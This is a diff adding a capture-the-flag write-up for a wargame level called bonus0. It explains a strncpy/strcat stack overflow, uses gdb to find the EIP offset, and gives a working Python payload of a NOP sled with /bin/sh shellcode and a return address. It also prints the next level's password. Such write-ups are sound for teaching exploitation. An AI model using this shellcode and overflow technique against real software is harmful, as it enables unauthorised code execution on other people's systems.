@@ -1,12 +1,91 @@
-Starting program: /home/user/bonus0/bonus0 
- - 
+## Root cause (from `bonus0.c`)
+
+- `p()` reads up to `0x1000` bytes into a local `buffer`, then copies **exactly 0x14 bytes** into `first`/`second` using `strncpy`.
+- If the input is **20 bytes or more**, `strncpy` does **not** add a null terminator.
+- `pp()` then uses `strcpy`/`strcat` into `result[42]` with untrusted strings, allowing a stack overflow.
+
+## Calculate EIP offset
+
+Using a cyclic pattern:
+
+```
+Starting program: /home/user/bonus0/bonus0
+ -
 121231213132131321321231
- - 
+ -
 Aa0Aa1Aa2Aa3Aa4Aa5Aa
 12123121313213132132Aa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���
 
 Program received signal SIGSEGV, Segmentation fault.
 0x41336141 in ?? ()
+```
 
-EIP offset is at `9`
+The crash shows `EIP = 0x41336141`, which corresponds to offset `9` in the second input.
 
+## Build payload (matches `Ressource/script`)
+
+1. **First input**: NOP sled + shellcode (placed in `first`).
+2. **Second input**: padding to reach EIP + return address into the NOP sled.
+
+After the shell is spawned, read the next password:
+
+- cat /home/user/bonus1/.pass
+
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
+## How to find a return address into the NOP sled
+
+Create the same two-line input as the exploit:
+
+```
+python - <<'PY' > /tmp/bonus0.in
+import sys
+shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+sys.stdout.write("\x90"*100 + shell + "\n")
+sys.stdout.write("A"*9 + "\xd0\xe6\xff\xbf" + "B"*7 + "\n")
+PY
+```
+
+In `gdb`:
+
+```
+gdb ./bonus0
+(gdb) run < /tmp/bonus0.in
+```
+
+At the breakpoint, `result` is at `$esp+0x16` (from disassembly). Search nearby:
+
+```
+(gdb) x/128bx $esp+0x16
+```
+
+Example output:
+
+```
+0xbfffe686:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbfffe68e:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbfffe696:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbfffe69e:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbfffe6a6:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbfffe6ae:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbfffe6b6:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbfffe6be:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbfffe6c6:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbfffe6ce:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbfffe6d6:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xbfffe6de:     0x90    0x90    0x90    0x90    0x90    0x90    0x31    0xc0
+0xbfffe6e6:     0x50    0x68    0x2f    0x2f    0x73    0x68    0x68    0x2f
+0xbfffe6ee:     0x62    0x69    0x6e    0x89    0xe3    0x89    0xc1    0x89
+0xbfffe6f6:     0xc2    0xb0    0x0b    0xcd    0x80    0x31    0xc0    0x40
+0xbfffe6fe:     0xcd    0x80    0x00    0x41    0x41    0x41    0x41    0x41
+```
+
+Choose an address **inside the NOP run** (We choose 0xbfffe6d6).
+
+## Why add `"B" * 7` in the second input
+
+The second input is copied with `strncpy(..., 0x14)`, so it takes **exactly 20 bytes**. We fill them as:
+
+- `"A" * 9` to reach the EIP overwrite offset
+- `4` bytes for the return address
+- `"B" * 7` as trailing padding to reach 20 bytes total
